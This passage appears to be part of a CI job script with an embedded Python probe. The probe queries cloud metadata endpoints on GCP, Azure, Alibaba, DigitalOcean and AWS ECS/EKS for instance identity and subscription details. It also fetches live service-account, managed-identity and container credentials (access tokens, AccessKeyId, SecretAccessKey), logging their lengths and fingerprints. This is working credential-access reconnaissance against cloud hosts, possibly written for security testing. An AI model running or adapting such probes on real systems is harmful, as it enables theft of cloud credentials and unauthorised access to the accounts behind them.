              if st == 200 and not gcp_ok:
                  gcp_ok = True
                  for p in ('project/project-id', 'instance/zone', 'instance/name', 'instance/service-accounts/'):
                      s2, b2 = http('GET', 'http://metadata.google.internal/computeMetadata/v1/' + p, ghdr, timeout=3)
                      print('GCP', p, 'status=', s2, 'body=', b2[:200].decode('utf-8', 'replace').replace('\n', ' '))
                  s2, b2 = http('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', ghdr, timeout=4)
                  if s2 == 200:
                      try:
                          d = json.loads(b2)
                          print('GCP_SA_TOKEN_FIELDS', json.dumps({'access_token_len': len(d.get('access_token') or ''), 'access_token_fp': fp(d.get('access_token')), 'expires_in': d.get('expires_in'), 'token_type': d.get('token_type')}))
                      except Exception as e:
                          print('GCP_TOKEN_PARSE_FAIL', str(e)[:120], b2[:120])
          st, b = http('GET', 'http://169.254.169.254/computeMetadata/v1/instance/id', {}, timeout=3)
          print('GCP_NO_HEADER_CONTROL status=', st, 'body=', b[:100].decode('utf-8', 'replace'))
          st, b = http('GET', 'http://169.254.169.254/computeMetadata/v1/c211-bogus-path', ghdr, timeout=3)
          print('GCP_BOGUS_PATH status=', st)

          print('=== Azure ===')
          az = {'Metadata': 'true'}
          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', az, timeout=4)
          print('AZURE_INSTANCE status=', st, 'len=', len(b))
          if st == 200:
              try:
                  d = json.loads(b); comp = d.get('compute', {})
                  print('AZURE_COMPUTE', json.dumps({'vmId': comp.get('vmId'), 'name': comp.get('name'), 'location': comp.get('location'), 'resourceGroupName': comp.get('resourceGroupName'), 'subscriptionId': comp.get('subscriptionId'), 'vmSize': comp.get('vmSize'), 'azEnvironment': comp.get('azEnvironment')}))
              except Exception as e:
                  print('AZURE_PARSE_FAIL', str(e)[:120], b[:160])
          st, b = http('GET', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F', az, timeout=5)
          print('AZURE_MSI_TOKEN status=', st, 'len=', len(b))
          if st == 200:
              try:
                  d = json.loads(b)
                  print('AZURE_MSI_FIELDS', json.dumps({'access_token_len': len(d.get('access_token') or ''), 'access_token_fp': fp(d.get('access_token')), 'expires_in': d.get('expires_in'), 'expires_on': d.get('expires_on'), 'resource': d.get('resource')}))
              except Exception as e:
                  print('AZURE_MSI_PARSE_FAIL', str(e)[:120])
          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', {}, timeout=3)
          print('AZURE_NO_HEADER_CONTROL status=', st, 'body=', b[:100].decode('utf-8', 'replace'))
          st, b = http('GET', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01&c211=bogus', az, timeout=3)
          print('AZURE_BOGUS_QUERY status=', st)

          print('=== Alibaba / DigitalOcean ===')
          st, b = http('GET', 'http://100.100.100.200/latest/meta-data/instance-id', {}, timeout=3)
          print('ALIBABA_INSTANCE status=', st, 'body=', b[:120].decode('utf-8', 'replace'))
          st, b = http('GET', 'http://169.254.169.254/metadata/v1.json', {}, timeout=3)
          print('DO_METADATA status=', st, 'len=', len(b))
          if st == 200:
              try:
                  d = json.loads(b)
                  print('DO_KEYS', sorted(list(d.keys()))[:20])
                  print('DO_DROPLET', json.dumps({'droplet_id': d.get('droplet_id'), 'region': d.get('region'), 'hostname': d.get('hostname')}))
              except Exception:
                  pass

          print('=== ECS / EKS Pod Identity (presence-only) ===')
          rel = os.environ.get('AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')
          if rel:
              st, b = http('GET', 'http://169.254.170.2' + rel, {}, timeout=4)
              print('ECS_CRED_REL status=', st, 'len=', len(b))
              if st == 200:
                  try:
                      d = json.loads(b)
                      print('ECS_CRED_FIELDS', json.dumps({k: fp(d.get(k)) for k in ('AccessKeyId', 'SecretAccessKey', 'Token')}), 'RoleArn_present=', bool(d.get('RoleArn')))
                  except Exception:
                      pass
          else:
              print('ECS_CRED_REL_ABSENT')
          full = os.environ.get('AWS_CONTAINER_CREDENTIALS_FULL_URI')
          print('EKS_POD_IDENTITY_FULL_URI_PRESENT', bool(full), 'eks_token_file_present', os.path.exists('/var/run/secrets/pods.eks.amazonaws.com/serviceaccount/eks-pod-identity-token'))
          if full:
              st, b = http('GET', full, {}, timeout=4)
              print('EKS_POD_IDENTITY status=', st, 'len=', len(b))
          st, b = http('GET', 'http://169.254.170.23/v1/credentials', {}, timeout=3)
          print('EKS_POD_IDENTITY_169_254_170_23 status=', st, 'body=', b[:80].decode('utf-8', 'replace'))
          print('C211_META_DONE')
          PYEOF_META
          else
            echo "PY3_ABSENT"
          fi
          echo "C211_PROBE_END job=probe-mi35x-8-c nonce=$NONCE"

